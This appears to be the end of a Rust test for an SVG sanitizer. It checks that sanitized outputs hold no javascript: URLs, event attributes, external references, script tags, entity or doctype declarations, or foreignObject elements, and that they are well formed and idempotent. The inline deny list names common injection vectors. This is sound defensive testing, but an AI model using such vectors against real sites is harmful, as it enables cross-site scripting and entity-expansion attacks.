    let mut accepted = 0usize;
    for input in &corpus {
        let Ok(out) = sanitize_svg(input) else {
            continue;
        };
        accepted += 1;
        let out = String::from_utf8(out).expect("output is UTF-8");
        let lower = out.to_ascii_lowercase();
        assert!(
            !has_javascript_url(&out),
            "javascript: URL in output: {out}"
        );
        for bad in ["<script", "<!entity", "<!doctype", "<foreignobject"] {
            assert!(!lower.contains(bad), "{bad:?} in output: {out}");
        }
        assert!(
            !has_event_attribute(&out),
            "event attribute in output: {out}"
        );
        assert!(
            !has_external_reference(&out),
            "external reference in output: {out}"
        );
        assert_well_formed(&out);
        assert_idempotent(&out);
    }
    assert!(
        accepted > 50,
        "the corpus must exercise accepted documents ({accepted})"
    );
}
